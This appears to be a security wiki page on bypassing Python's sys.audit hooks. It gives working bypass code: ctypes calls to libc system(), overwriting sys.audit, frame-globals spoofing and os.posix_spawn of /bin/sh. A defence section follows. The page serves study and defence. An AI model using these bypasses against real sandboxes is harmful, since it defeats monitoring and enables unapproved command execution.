---
title: Bypassing sys.audit Hooks
slug: python-sys-audit-bypass
---

> **TL;DR:** PEP 578 audit hooks are advisory — they run in-process at the same privilege as the payload, so `ctypes`, frame tampering, or interpreter-state surgery can mute them.

## What it is
Python 3.8 added `sys.addaudithook` and a fleet of audit events (`exec`, `compile`, `os.system`, `subprocess.Popen`, `open`, `pickle.find_class`, ...). Defenders use them to log or block dangerous actions inside a single Python process. CTFs and hardened apps lean on them as a last line of defence, but the hook list lives in mutable interpreter state and is reachable from any code that already runs in the interpreter.

## Preconditions / where it applies
- Python 3.8+ with a custom `addaudithook` that raises on `os.system`, `exec`, etc.
- Attacker already has code execution inside the interpreter (post-SSTI, post-pickle, plugin)
- `ctypes` is importable, or the libpython symbol table is reachable
- No external seccomp / LSM layer enforcing the same policy

## Technique
Three independent angles — pick whichever the current sandbox allows.

```python
import sys, ctypes

# 1) Direct syscall via ctypes — no `os.system` event fires
libc = ctypes.CDLL(None)
libc.system(b"id > /tmp/pwn")

# 2) Tamper the audit hook list through the interpreter state.
#    Hooks live in PyInterpreterState->audit_hooks (linked list).
#    Easiest user-space approach: shadow sys.audit itself.
import sys as _s
_s.audit = lambda *a, **k: None      # downstream code calls _s.audit
# Many stdlib paths use the C-level PySys_Audit, so also patch the C side:
ctypes.pythonapi.PySys_AddAuditHook  # exists; no public removal API
# Walk and replace via the private structure:
hooks_ptr = ctypes.c_void_p.in_dll(ctypes.pythonapi, "_PyRuntime")
# (offset walking is version specific; in CTF, fingerprint by sys.version_info)

# 3) Frame-stack tampering — fool a hook that checks the caller frame
def _spoof():
    f = sys._getframe(1)
    f.f_globals["__name__"] = "logging"   # pretend to be allowlisted module
    import os; os.system("id")
_spoof()

# 4) Fork-then-exec via os.posix_spawn — older versions missed the audit event
import os
os.posix_spawn("/bin/sh", ["/bin/sh", "-c", "id"], os.environ)
```

Reliability ranking: ctypes > posix_spawn quirks > frame spoofing > interpreter-state walks (very version-specific).

## Detection and defence
- Treat `sys.audit` as telemetry, never as a security boundary — pair it with seccomp-bpf and Linux user namespaces
- Block `ctypes` and `cffi` imports at the loader level with a `MetaPathFinder` that raises before the C extension binds
- Run the interpreter under `prctl(PR_SET_NO_NEW_PRIVS)` + seccomp allowing only the syscalls your app needs; `system` calls `execve` which you can deny
- Forward audit events to an out-of-process collector over a unix socket the sandboxed process cannot write to after startup (drop FD-passing privileges)
- Hook `_PyImport_FindBuiltin` to deny `ctypes` and freeze `sys.modules`

## References
- [PEP 578 — Runtime Audit Hooks](https://peps.python.org/pep-0578/) — design and threat model
- [Python audit events table](https://docs.python.org/3/library/audit_events.html) — full event list

See also: [[python-sandbox-escape]], [[python-deserialization]], [[python-dangerous-sinks]].
